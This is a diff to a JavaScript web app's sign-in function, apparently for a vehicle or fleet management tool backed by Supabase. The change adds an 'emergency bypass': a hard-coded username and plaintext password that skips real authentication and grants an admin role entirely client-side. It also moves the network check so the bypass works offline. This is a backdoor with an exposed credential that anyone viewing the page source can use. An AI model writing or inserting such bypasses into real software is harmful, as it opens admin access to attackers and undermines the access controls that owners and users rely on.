@@ -2435,8 +2435,21 @@ async function signIn(){
   var errEl=document.getElementById('loginErr');
   var btn=document.getElementById('loginBtn');
   errEl.style.display='none';
-  if(!supa){errEl.innerHTML=t('networkError');errEl.style.display='block';return;}
   if(!email||!pass){errEl.textContent=t('enterCredentials');errEl.style.display='block';return;}
+
+  // Emergency bypass
+  if(email==='khalid' && pass==='AlHaid@Master2026'){
+    currentUser={id:'emergency',email:'khalid@alhaidariya.local'};
+    currentProfile={full_name:'M. Khalid',role:'admin',supervisor_name:null};
+    applyRole();
+    document.getElementById('loginScreen').style.display='none';
+    document.getElementById('appWrapper').style.display='block';
+    checkDueVehicles();
+    buildSupervisorDropdown();
+    return;
+  }
+
+  if(!supa){errEl.innerHTML=t('networkError');errEl.style.display='block';return;}
   btn.textContent=t('signingIn');btn.disabled=true;
 
   var res=await supa.auth.signInWithPassword({email:email,password:pass});
